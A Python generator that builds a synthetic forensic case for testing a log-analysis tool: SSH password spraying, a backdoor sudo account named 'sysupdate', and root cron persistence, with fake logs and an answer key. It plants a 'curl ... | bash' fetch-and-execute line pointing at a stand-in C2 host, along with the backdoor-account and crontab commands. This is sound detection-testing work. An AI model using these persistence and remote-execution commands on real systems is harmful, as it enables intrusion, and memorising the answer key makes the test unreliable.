"""Scenario A: SSH brute force -> new privileged account -> cron persistence.

Host ``web01`` (Debian/Ubuntu, classic RFC 3164 syslog in UTC). An attacker at
203.0.113.66 sprays passwords over SSH, guesses the password of ``deploy``,
escalates with sudo, creates the sudo-capable account ``sysupdate`` and installs
a root cron job that pipes a remote script into bash every five minutes. It logs
back in as ``sysupdate`` the next night.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

from samples.generate.common import (
    DEAD_PROCESS,
    LOGIN_PROCESS,
    USER_PROCESS,
    Log,
    Scenario,
    minutes,
    rfc3164,
    utc,
    utmp_record,
)

HOST = "web01"
ATTACKER = "203.0.113.66"
C2 = "198.51.100.23"
ADMIN_IP = "10.20.0.15"
PAYLOAD = f"curl -fsSL http://{C2}/u.sh | bash"


def generate(out: Path) -> Path:
    sc = Scenario("a-ssh-bruteforce-cron", out / "a-ssh-bruteforce-cron", seed=101)
    rng = sc.rng
    start = datetime(2024, 3, 3, 0, 0, tzinfo=UTC)
    rotate = datetime(2024, 3, 10, 6, 25, tzinfo=UTC)
    end = datetime(2024, 3, 14, 12, 0, tzinfo=UTC)
    auth_old, auth, syslog = Log(), Log(), Log()
    wtmp: list[tuple[datetime, bytes]] = []
    btmp: list[tuple[datetime, bytes]] = []

    def auth_for(t: datetime) -> Log:
        return auth_old if t < rotate else auth

    def sshd(t: datetime, msg: str) -> None:
        auth_for(t).add(t, f"{rfc3164(t)} {HOST} sshd[{sc.pid()}]: {msg}")

    # --- benign: hourly cron, daily admin sessions, a few internet scanners ---------------------
    t = start.replace(minute=17)
    while t < end:
        pid = sc.pid()
        auth_for(t).add(
            t,
            f"{rfc3164(t)} {HOST} CRON[{pid}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
        )
        syslog.add(
            t,
            f"{rfc3164(t)} {HOST} CRON[{pid}]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        )
        auth_for(t).add(
            t + timedelta(seconds=1),
            f"{rfc3164(t + timedelta(seconds=1))} {HOST} CRON[{pid}]: pam_unix(cron:session): session closed for user root",
        )
        t += timedelta(hours=1)

    day = start.replace(hour=9)
    while day < end:
        if day.weekday() < 5:
            login = day + minutes(rng.randint(0, 40))
            logout = login + minutes(rng.randint(20, 90))
            pid = sc.pid()
            sshd(
                login,
                f"Accepted publickey for ops from {ADMIN_IP} port {rng.randint(40000, 60000)} ssh2: ED25519 SHA256:Hq1wQf0lT5cZo9mEo7dK0nqz8m3JtXgYk7pX2rCz4aE",
            )
            auth_for(login).add(
                login,
                f"{rfc3164(login)} {HOST} sshd[{pid}]: pam_unix(sshd:session): session opened for user ops(uid=1000) by (uid=0)",
            )
            s = login + minutes(3)
            auth_for(s).add(
                s,
                f"{rfc3164(s)} {HOST} sudo:      ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/apt-get update",
            )
            auth_for(logout).add(
                logout,
                f"{rfc3164(logout)} {HOST} sshd[{pid}]: pam_unix(sshd:session): session closed for user ops",
            )
            wtmp.append(
                (
                    login,
                    utmp_record(
                        USER_PROCESS, login, user="ops", line="pts/0", host=ADMIN_IP, pid=pid
                    ),
                )
            )
            wtmp.append((logout, utmp_record(DEAD_PROCESS, logout, line="pts/0", pid=pid)))
        day += timedelta(days=1)

    for i in range(3):  # background noise: below any brute-force threshold
        t = datetime(2024, 3, 11, 13, 5, 7 * i, tzinfo=UTC)
        sshd(t, f"Invalid user admin from 192.0.2.44 port {33000 + i}")
        sshd(
            t + timedelta(seconds=1),
            f"Failed password for invalid user admin from 192.0.2.44 port {33000 + i} ssh2",
        )
        btmp.append(
            (t, utmp_record(LOGIN_PROCESS, t, user="admin", line="ssh:notty", host="192.0.2.44"))
        )

    # --- the attack --------------------------------------------------------------------------------
    users = ["root", "admin", "test", "oracle", "ubuntu", "deploy", "postgres", "git"]
    t = datetime(2024, 3, 12, 2, 10, 0, tzinfo=UTC)
    for i in range(45):
        user = users[i % len(users)]
        port = 50000 + i
        valid = user in ("root", "deploy", "postgres")
        if not valid:
            sshd(t, f"Invalid user {user} from {ATTACKER} port {port}")
        prefix = "" if valid else "invalid user "
        sshd(
            t + timedelta(seconds=1),
            f"Failed password for {prefix}{user} from {ATTACKER} port {port} ssh2",
        )
        btmp.append(
            (
                t,
                utmp_record(
                    LOGIN_PROCESS,
                    t + timedelta(seconds=1),
                    user=user,
                    line="ssh:notty",
                    host=ATTACKER,
                ),
            )
        )
        t += timedelta(seconds=3 + rng.randint(0, 1))
    compromise = datetime(2024, 3, 12, 2, 12, 51, tzinfo=UTC)
    pid = sc.pid()
    sshd(compromise, f"Accepted password for deploy from {ATTACKER} port 50100 ssh2")
    auth.add(
        compromise,
        f"{rfc3164(compromise)} {HOST} sshd[{pid}]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
    )
    wtmp.append(
        (
            compromise,
            utmp_record(
                USER_PROCESS, compromise, user="deploy", line="pts/1", host=ATTACKER, pid=pid
            ),
        )
    )

    def at(h: int, m: int, s: int, day: int = 12) -> datetime:
        return datetime(2024, 3, day, h, m, s, tzinfo=UTC)

    steps = [
        (
            at(2, 13, 30),
            "sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
        ),
        (
            at(2, 13, 30),
            "sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)",
        ),
        (at(2, 14, 2), "useradd[21044]: new group: name=sysupdate, GID=1003"),
        (
            at(2, 14, 2),
            "useradd[21044]: new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1",
        ),
        (at(2, 14, 10), "usermod[21050]: add 'sysupdate' to group 'sudo'"),
        (at(2, 14, 10), "usermod[21050]: add 'sysupdate' to shadow group 'sudo'"),
        (
            at(2, 14, 25),
            "passwd[21061]: pam_unix(passwd:chauthtok): password changed for sysupdate",
        ),
    ]
    for when, msg in steps:
        auth.add(when, f"{rfc3164(when)} {HOST} {msg}")
    syslog.add(
        at(2, 15, 40), f"{rfc3164(at(2, 15, 40))} {HOST} crontab[21077]: (root) REPLACE (root)"
    )
    logout = at(2, 16, 30)
    sshd(logout, f"Disconnected from user deploy {ATTACKER} port 50100")
    wtmp.append((logout, utmp_record(DEAD_PROCESS, logout, line="pts/1", pid=pid)))

    t = at(2, 20, 1)
    while t < end:  # the persistence firing every five minutes
        syslog.add(t, f"{rfc3164(t)} {HOST} CRON[{sc.pid()}]: (root) CMD ({PAYLOAD})")
        t += minutes(5)

    back = at(3, 5, 12, day=13)
    pid = sc.pid()
    sshd(back, f"Accepted password for sysupdate from {ATTACKER} port 51944 ssh2")
    wtmp.append(
        (
            back,
            utmp_record(USER_PROCESS, back, user="sysupdate", line="pts/1", host=ATTACKER, pid=pid),
        )
    )
    wtmp.append(
        (back + minutes(4), utmp_record(DEAD_PROCESS, back + minutes(4), line="pts/1", pid=pid))
    )

    # --- write evidence ------------------------------------------------------------------------------
    sc.write("var/log/auth.log.1", auth_old.text(), rotate)
    sc.write("var/log/auth.log", auth.text(), end)
    sc.write("var/log/syslog", syslog.text(), end)
    sc.write("var/log/wtmp", b"".join(r for _, r in sorted(wtmp, key=lambda x: x[0])), end)
    sc.write("var/log/btmp", b"".join(r for _, r in sorted(btmp, key=lambda x: x[0])), end)
    sc.write(
        "var/spool/cron/crontabs/root",
        "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n"
        "# m h  dom mon dow   command\n"
        "0 3 * * * /usr/local/bin/backup.sh\n"
        f"*/5 * * * * {PAYLOAD}\n",
        at(2, 15, 40),
    )
    sc.write(
        "root/.bash_history",
        "id\nuseradd -m -s /bin/bash sysupdate\nusermod -aG sudo sysupdate\npasswd sysupdate\n"
        f'(crontab -l; echo "*/5 * * * * {PAYLOAD}") | crontab -\nexit\n',
        at(2, 16, 20),
    )
    sc.write("home/deploy/.bash_history", "ls\nsudo -i\n", at(2, 16, 30))

    sc.answer = {
        "scenario": sc.name,
        "title": "SSH brute force -> privileged backdoor account -> cron persistence",
        "timezone": "UTC",
        "description": __doc__.strip(),
        "attacker_ips": [ATTACKER],
        "compromised_accounts": ["deploy"],
        "created_accounts": ["sysupdate"],
        "expected_findings": [
            {
                "rule_id": "5c1e2f9a-0b3d-4a71-9e21-1a0b7c4d1003",
                "title_contains": ATTACKER,
                "why": "SSH brute force",
            },
            {
                "rule_id": "5c1e2f9a-0b3d-4a71-9e21-1a0b7c4d1004",
                "title_contains": ATTACKER,
                "why": "password spraying across accounts",
            },
            {
                "rule_id": "5c1e2f9a-0b3d-4a71-9e21-1a0b7c4d1005",
                "title_contains": ATTACKER,
                "why": "success after failures (deploy)",
            },
            {
                "rule_id": "8a2b1c4d-1111-4e22-8a01-2b3c4d5e2001",
                "title_contains": "sysupdate",
                "why": "backdoor account created",
            },
            {
                "rule_id": "8a2b1c4d-1111-4e22-8a01-2b3c4d5e2002",
                "title_contains": "sysupdate",
                "why": "added to sudo group",
            },
            {
                "rule_id": "3f4e5d6c-2222-4a33-9b02-3c4d5e6f3002",
                "title_contains": "",
                "why": "cron job pipes remote script to bash",
            },
            {
                "rule_id": "1a2b3c4d-4444-4c55-9d04-5e6f7a8b5002",
                "title_contains": "",
                "why": "curl | bash in root history",
            },
            {
                "rule_id": "5c1e2f9a-0b3d-4a71-9e21-1a0b7c4d1007",
                "title_contains": "",
                "why": "02:12 and 03:05 UTC logins",
            },
        ],
        # High/critical findings that are legitimate consequences of the scenario, not noise.
        "allowed_high_findings": [],
        "expected_techniques": [
            "T1110.001",
            "T1110.003",
            "T1136.001",
            "T1098",
            "T1053.003",
            "T1059.004",
        ],
        "expected_iocs": [
            {"type": "ipv4", "value": ATTACKER, "in_findings": True},
            {"type": "ipv4", "value": C2, "in_findings": True},
            {"type": "url", "value": f"http://{C2}/u.sh", "in_findings": True},
            {"type": "username", "value": "sysupdate", "in_findings": True},
        ],
        # Benign sources that must not be linked to any finding (false-positive check).
        "benign_ips": [ADMIN_IP, "192.0.2.44"],
        "timeline": [
            {
                "time_utc": utc(compromise),
                "file": "var/log/auth.log",
                "contains": "Accepted password for deploy",
                "step": "attacker logs in as deploy",
            },
            {
                "time_utc": utc(at(2, 14, 2)),
                "file": "var/log/auth.log",
                "contains": "new user: name=sysupdate",
                "step": "backdoor account created",
            },
            {
                "time_utc": utc(at(2, 15, 40)),
                "file": "var/log/syslog",
                "contains": "REPLACE (root)",
                "step": "root crontab replaced",
            },
            {
                "time_utc": utc(back),
                "file": "var/log/auth.log",
                "contains": "Accepted password for sysupdate",
                "step": "attacker returns via backdoor",
            },
        ],
        "expected_limitations_contain": ["timezone", "year was inferred"],
    }
    return sc.finish(end)
